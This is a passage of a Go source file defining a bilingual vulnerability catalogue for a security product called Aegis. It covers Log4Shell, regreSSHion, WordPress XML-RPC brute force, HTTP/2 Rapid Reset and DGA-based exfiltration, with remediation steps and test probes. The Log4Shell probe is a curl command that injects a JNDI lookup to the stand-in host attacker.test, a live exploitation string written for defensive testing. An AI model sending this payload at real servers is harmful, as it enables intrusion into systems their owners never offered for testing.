				"Mettre à jour log4j-core vers >= 2.17.1 dans pom.xml / build.gradle et recompiler l'artefact Java",
				"En mesure d'urgence sans recompilation : définir la propriété JVM -Dlog4j2.formatMsgNoLookups=true ou supprimer la classe JndiLookup du JAR : zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class",
				"Redémarrer les conteneurs ou services JVM concernés",
			},
			EN: []string{
				"Upgrade log4j-core to >= 2.17.1 in pom.xml / build.gradle and rebuild Java binaries",
				"Emergency hot mitigation without rebuild: set JVM property -Dlog4j2.formatMsgNoLookups=true or remove JndiLookup class from JAR: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class",
				"Restart concerned JVM containers and application daemons",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "curl -i https://<domaine>/ -H 'User-Agent: ${jndi:ldap://attacker.test/exploit}'  # Attendu: HTTP 403 Forbidden",
			EN: "curl -i https://<domain>/ -H 'User-Agent: ${jndi:ldap://attacker.test/exploit}'  # Expected: HTTP 403 Forbidden",
		},
		CISAKEV:     true,
		PublishedAt: "2021-12-10",
	},
	{
		ID:    "CVE-2026-109619",
		CVEID: "CVE-2026-109619",
		Name: LocalizedText{
			FR: "RMM Outbound Tunneling & DGA C2 Exfiltration",
			EN: "RMM Outbound Tunneling & DGA C2 Exfiltration",
		},
		Severity: "HIGH",
		CVSS:     "8.5",
		Component: LocalizedText{
			FR: "DNS Sortant / Démons RMM & Reverse-Tunneling",
			EN: "Outbound DNS / RMM & Reverse-Tunneling Daemons",
		},
		AffectedVersions: LocalizedText{
			FR: "Tout serveur Linux/Conteneur sans filtrage Egress Zero-Trust",
			EN: "All Linux servers / containers lacking Egress Zero-Trust filtering",
		},
		Title: LocalizedText{
			FR: "Détournement de canal sortant & Exfiltration furtive par domaine généré (DGA)",
			EN: "Outbound Channel Hijacking & Covert Exfiltration via Algorithmically Generated Domains (DGA)",
		},
		Description: LocalizedText{
			FR: "Après compromission d'un plugin ou d'une dépendance NPM/PyPI/Composer, le malware contacte un domaine C2 généré algorithmiquement (haute entropie de Shannon) pour exfiltrer les secrets (.env, base de données).",
			EN: "Following supply-chain or plugin compromise (NPM/PyPI/Composer), malware beacons out to algorithmically generated domains (high Shannon entropy) to exfiltrate secrets (.env, database credentials).",
		},
		Vector: LocalizedText{
			FR: "EGRESS / DNS DGA (Entropie > 4.2 bits) & Tunnel HTTPS sortant",
			EN: "EGRESS / DNS DGA (Entropy > 4.2 bits) & Outbound HTTPS Tunnel",
		},
		Remediation: LocalizedText{
			FR: "1. [Immédiat] Filtrage actif par Aegis Egress Gateway (Sinkhole DNS :5053 + Entropie de Shannon). 2. [Racine] Auditer les dépendances tierces et révoquer les secrets exposés.",
			EN: "1. [Immediate] Active filtering via Aegis Egress Gateway (DNS Sinkhole :5053 + Shannon Entropy). 2. [Root Fix] Audit 3rd-party dependencies and rotate exposed credentials.",
		},
		BlockedByAegis:      true,
		IsActiveDefense:     true,
		CoverageStatus:      "MITIGATED_EGRESS_ONLY",
		VirtualPatchRuleID:  "EGRESS-C2-SINKHOLE",
		VirtualPatchSummary: LocalizedText{
			FR: "Aegis Egress calcule l'entropie de Shannon sur chaque requête DNS sortante (< 1 ms) et renvoie 0.0.0.0 pour tout domaine suspect ou non inscrit en liste blanche.",
			EN: "Aegis Egress calculates Shannon entropy on every outbound DNS request (< 1 ms) and resolves 0.0.0.0 for any suspicious or non-allowlisted domain.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Forcer le résolveur DNS des conteneurs vers Aegis Egress (:5053) et interdire les sorties directes sur les ports 53/853 via nftables/iptables",
				"Exécuter un audit des dépendances : npm audit / composer audit / pip-audit et supprimer les paquets compromis",
				"Effectuer une rotation immédiate des clés API, mots de passe DB et certificats présents dans l'environnement du service",
			},
			EN: []string{
				"Route container DNS resolver through Aegis Egress (:5053) and prohibit direct egress to port 53/853 via nftables/iptables",
				"Run dependency audit: npm audit / composer audit / pip-audit and remove rogue or compromised packages",
				"Perform immediate rotation of API keys, database credentials, and certificates present in service environment",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "dig @127.0.0.1 -p 5053 x9k2m8v4q1z7p3w5r0t6y.c2-botnet.top +short  # Attendu: 0.0.0.0 (Sinkholed)",
			EN: "dig @127.0.0.1 -p 5053 x9k2m8v4q1z7p3w5r0t6y.c2-botnet.top +short  # Expected: 0.0.0.0 (Sinkholed)",
		},
		CISAKEV:     false,
		PublishedAt: "2026-01-20",
	},
	{
		ID:    "CVE-2024-6387",
		CVEID: "CVE-2024-6387",
		Name: LocalizedText{
			FR: "regreSSHion — OpenSSH Server Race Condition RCE",
			EN: "regreSSHion — OpenSSH Server Race Condition RCE",
		},
		Severity: "CRITICAL",
		CVSS:     "8.1",
		Component: LocalizedText{
			FR: "Serveur OpenSSH (sshd sur Linux glibc)",
			EN: "OpenSSH Server (sshd on Linux glibc)",
		},
		AffectedVersions: LocalizedText{
			FR: "OpenSSH 8.5p1 <= version < 9.8p1",
			EN: "OpenSSH 8.5p1 <= version < 9.8p1",
		},
		Title: LocalizedText{
			FR: "Condition de concurrence (Race Condition) dans SIGALRM d'OpenSSH menant à une RCE root",
			EN: "Race condition in OpenSSH SIGALRM signal handler leading to root Remote Code Execution",
		},
		Description: LocalizedText{
			FR: "Une gestion non sûre des signaux asynchrones (SIGALRM) dans sshd permet à un attaquant distant non authentifié d'exécuter du code avec les privilèges root après expiration de LoginGraceTime.",
			EN: "Unsafe signal handling (SIGALRM) in sshd allows an unauthenticated remote attacker to execute arbitrary code with root privileges upon LoginGraceTime expiration.",
		},
		Vector: LocalizedText{
			FR: "RÉSEAU TCP :22 (Démon SSH — Hors périmètre WAF HTTP)",
			EN: "NETWORK TCP :22 (SSH Daemon — Outside HTTP WAF perimeter)",
		},
		Remediation: LocalizedText{
			FR: "1. [Atténuation Aegis] Aegis Egress bloque les connexions C2 post-exploitation. 2. [Racine Obligatoire] Mettre à jour openssh-server vers >= 9.8p1 ou définir LoginGraceTime 0 dans /etc/ssh/sshd_config.",
			EN: "1. [Aegis Mitigation] Aegis Egress severs post-exploit C2 callbacks. 2. [Mandatory Root Fix] Upgrade openssh-server to >= 9.8p1 or set LoginGraceTime 0 in /etc/ssh/sshd_config.",
		},
		BlockedByAegis:      false,
		IsActiveDefense:     true,
		CoverageStatus:      "HOST_PATCH_REQUIRED",
		VirtualPatchRuleID:  "EGRESS-C2-SINKHOLE (Post-Exploit Mitigation)",
		VirtualPatchSummary: LocalizedText{
			FR: "Attention : cette faille cible le démon SSH TCP :22 et non le flux HTTP. Aegis ne remplace pas le patch OS de sshd, mais Aegis Egress bloque le téléchargement de payloads secondaires par l'attaquant.",
			EN: "Notice: this vulnerability targets the SSH daemon on TCP :22 rather than HTTP flows. Aegis does not replace host OS sshd patching, but Aegis Egress blocks secondary payload downloads.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Mettre à jour immédiatement le serveur OpenSSH : sudo apt update && sudo apt install --only-upgrade openssh-server",
				"Si la mise à jour immédiate est impossible, éditer /etc/ssh/sshd_config et définir : LoginGraceTime 0",
				"Restreindre l'accès au port SSH (22) uniquement à vos adresses IP d'administration ou VPN WireGuard/Tailscale via ufw / nftables : sudo ufw limit from <IP_ADMIN> to any port 22",
				"Recharger le service SSH sans couper votre session active : sudo systemctl reload ssh",
			},
			EN: []string{
				"Immediately upgrade OpenSSH server packages: sudo apt update && sudo apt install --only-upgrade openssh-server",
				"If immediate upgrade cannot be performed, edit /etc/ssh/sshd_config and configure: LoginGraceTime 0",
				"Restrict SSH port (22) exposure to trusted management IPs or WireGuard/Tailscale VPN via ufw / nftables: sudo ufw limit from <IP_ADMIN> to any port 22",
				"Reload the SSH daemon without disconnecting active sessions: sudo systemctl reload ssh",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "ssh -V  # Vérifier que la version est >= OpenSSH_9.8p1 ou comporte le backport Debian/Ubuntu sécurisé",
			EN: "ssh -V  # Verify installed version is >= OpenSSH_9.8p1 or includes Debian/Ubuntu security backport",
		},
		CISAKEV:     false,
		PublishedAt: "2024-07-01",
	},
	{
		ID:    "WP-XMLRPC-BRUTE",
		CVEID: "CVE-2024-10963",
		Name: LocalizedText{
			FR: "WordPress XML-RPC Multicall Amplification & User Enum",
			EN: "WordPress XML-RPC Multicall Amplification & User Enum",
		},
		Severity: "HIGH",
		CVSS:     "8.2",
		Component: LocalizedText{
			FR: "WordPress Core & Extensions (/xmlrpc.php, /wp-json/)",
			EN: "WordPress Core & Plugins (/xmlrpc.php, /wp-json/)",
		},
		AffectedVersions: LocalizedText{
			FR: "WordPress 5.x / 6.x avec xmlrpc.php actif",
			EN: "WordPress 5.x / 6.x with enabled xmlrpc.php",
		},
		Title: LocalizedText{
			FR: "Amplification Brute-Force via system.multicall XML-RPC & Énumération des comptes administrateurs",
			EN: "Brute-Force Amplification via XML-RPC system.multicall & Administrator User Enumeration",
		},
		Description: LocalizedText{
			FR: "Une seule requête HTTP POST vers /xmlrpc.php peut tester jusqu'à 500 mots de passe simultanément (system.multicall), saturant le CPU/MySQL et compromettant les comptes révélés par /wp-json/wp/v2/users.",
			EN: "A single HTTP POST request to /xmlrpc.php can verify up to 500 password pairs concurrently (system.multicall), exhausting CPU/MySQL resources and compromising accounts exposed via /wp-json/wp/v2/users.",
		},
		Vector: LocalizedText{
			FR: "RÉSEAU / POST /xmlrpc.php & GET /wp-json/wp/v2/users",
			EN: "NETWORK / POST /xmlrpc.php & GET /wp-json/wp/v2/users",
		},
		Remediation: LocalizedText{
			FR: "1. [Immédiat] Verrouillage de /xmlrpc.php et des sondes bots en bordure par Aegis Gate. 2. [Racine] Désactiver XML-RPC dans WordPress et restreindre l'API REST.",
			EN: "1. [Immediate] Edge lockdown of /xmlrpc.php and automated bot probes via Aegis Gate. 2. [Root Fix] Disable XML-RPC in WordPress core and restrict REST user API.",
		},
		BlockedByAegis:      true,
		IsActiveDefense:     true,
		CoverageStatus:      "COVERED_VIRTUAL_PATCH",
		VirtualPatchRuleID:  "WAF-CMS-SHIELD",
		VirtualPatchSummary: LocalizedText{
			FR: "Aegis Gate intercepte et rejette en 0.2 ms les appels à /xmlrpc.php, /.env, /.git/config et limite drastiquement les tentatives sur /wp-login.php avant toute sollicitation de PHP/MySQL.",
			EN: "Aegis Gate intercepts and drops calls to /xmlrpc.php, /.env, /.git/config in 0.2 ms and severely throttles brute-force probes against /wp-login.php before touching PHP/MySQL.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Bloquer l'accès à /xmlrpc.php dans la configuration Nginx/Apache du serveur ou ajouter add_filter('xmlrpc_enabled', '__return_false');",
				"Désactiver l'énumération publique des utilisateurs via l'endpoint REST /wp-json/wp/v2/users pour les visiteurs non connectés",
				"Maintenir le cœur WordPress et les extensions à jour et supprimer tout plugin inactif",
			},
			EN: []string{
				"Block incoming access to /xmlrpc.php in Nginx/Apache web server config or add add_filter('xmlrpc_enabled', '__return_false');",
				"Disable public REST user enumeration through /wp-json/wp/v2/users endpoint for unauthenticated visitors",
				"Keep WordPress core and active plugins updated, removing any dormant extensions",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "curl -i -X POST https://<domaine>/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'  # Attendu: HTTP 403 Forbidden",
			EN: "curl -i -X POST https://<domain>/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'  # Expected: HTTP 403 Forbidden",
		},
		CISAKEV:     false,
		PublishedAt: "2024-11-05",
	},
	{
		ID:    "CVE-2023-44487",
		CVEID: "CVE-2023-44487",
		Name: LocalizedText{
			FR: "HTTP/2 Rapid Reset DDoS & Server Banner Exposure",
			EN: "HTTP/2 Rapid Reset DDoS & Server Banner Exposure",
		},
		Severity: "HIGH",
		CVSS:     "7.5",
		Component: LocalizedText{
			FR: "Pile HTTP/2 Nginx / Apache / Envoy / Node.js",
			EN: "Nginx / Apache / Envoy / Node.js HTTP/2 Stack",
		},
		AffectedVersions: LocalizedText{
			FR: "Serveurs HTTP/2 non durcis & Bannières Server exposées",
			EN: "Unhardened HTTP/2 servers & exposed Server headers",
		},
		Title: LocalizedText{
			FR: "Saturation CPU par rafales RST_STREAM HTTP/2 & Divulgation de version serveur",
			EN: "CPU exhaustion via HTTP/2 RST_STREAM bursts & Server banner version disclosure",
		},
		Description: LocalizedText{
			FR: "L'envoi massif de trames HEADERS immédiatement annulées par RST_STREAM contourne la limite de flux concurrents et épuise le CPU, tandis que l'en-tête Server facilite le ciblage automatisé.",
			EN: "Massive transmission of HEADERS frames followed immediately by RST_STREAM resets circumvents concurrent stream quotas and exhausts server CPU, while verbose Server banners assist threat reconnaissance.",
		},
		Vector: LocalizedText{
			FR: "RÉSEAU / Rafales RST_STREAM HTTP/2 & Reconnaissance d'empreinte",
			EN: "NETWORK / HTTP/2 RST_STREAM Flood & Service Fingerprinting",
		},
		Remediation: LocalizedText{
			FR: "1. [Immédiat] Limitation de débit et nettoyage des en-têtes par Aegis Gate PEP. 2. [Racine] Mettre à jour Nginx/Apache et activer server_tokens off.",
			EN: "1. [Immediate] Rate limiting and banner sanitization by Aegis Gate PEP. 2. [Root Fix] Upgrade Nginx/Apache and set server_tokens off.",
		},
		BlockedByAegis:      true,
		IsActiveDefense:     true,
		CoverageStatus:      "COVERED_VIRTUAL_PATCH",
		VirtualPatchRuleID:  "WAF-HEADER-SANITIZER",
		VirtualPatchSummary: LocalizedText{
			FR: "Aegis Gate masque les en-têtes Server / X-Powered-By en sortie et applique un coupe-circuit de débit par IP pour absorber les rafales.",
			EN: "Aegis Gate cloaks outbound Server and X-Powered-By headers and enforces in-memory IP rate-limiting to absorb reset bursts.",
		},
		RootFixProcedure: LocalizedSteps{
			FR: []string{
				"Dans /etc/nginx/nginx.conf, ajouter server_tokens off; et limiter keepalive_requests 1000;",
				"Sur Apache (/etc/apache2/conf-enabled/security.conf), définir ServerTokens Prod et ServerSignature Off",
				"Mettre à jour le binaire Nginx (>= 1.25.3) ou Apache (>= 2.4.58) et recharger la configuration",
			},
			EN: []string{
				"In /etc/nginx/nginx.conf, configure server_tokens off; and tune keepalive_requests 1000;",
				"On Apache (/etc/apache2/conf-enabled/security.conf), set ServerTokens Prod and ServerSignature Off",
				"Upgrade Nginx (>= 1.25.3) or Apache (>= 2.4.58) binaries and reload service configuration",
			},
		},
		VerificationProbe: LocalizedText{
			FR: "curl -I https://<domaine>/ | grep -iE '^(server|x-powered-by):'  # Attendu: Aucune version exacte divulguée",
			EN: "curl -I https://<domain>/ | grep -iE '^(server|x-powered-by):'  # Expected: No exact software version disclosed",
		},
		CISAKEV:     true,
		PublishedAt: "2023-10-10",
	},
}
